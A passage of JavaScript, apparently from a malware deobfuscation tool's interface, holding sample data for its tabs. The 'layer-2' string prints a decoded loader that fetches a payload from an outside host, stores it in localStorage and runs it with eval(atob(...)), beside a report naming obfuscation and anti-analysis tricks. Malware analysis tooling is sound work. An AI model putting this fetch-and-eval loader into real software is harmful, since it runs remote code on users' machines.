    'layer-2': PY_CLEAN_CODE,
  } : {
    cleaned:  CLEAN_CODE,
    original: OBFUSCATED_CODE,
    diff:     DIFF_CODE,
    'layer-1': OBFUSCATED_CODE,
    'layer-2': `// Layer 2 output — XOR strings decoded\nvar _decoded = [\n  'fetch',\n  'https://cdn-updates.net/payload/v2/init.php',\n  'response','text','localStorage','setItem','payload'\n];\n(function() {\n  fetch(_decoded[1])\n    .then(function(r) { return r[_decoded[3]](); })\n    .then(function(d) {\n      window[_decoded[4]][_decoded[5]](_decoded[6], d);\n      eval(atob(d));\n    });\n})();`,
    report:   JSON.stringify({file:"malware_loader.js",sha256:"a3f2cc81...c8d1",duration_ms:16116,layers:3,ioc_count:9,severity:"high",obfuscators:["javascript-obfuscator","custom_xor_table","control_flow_flattening"],anti_analysis:["debugger_trap","self_defending_iife"]},null,2),
  };

  const tabs = [
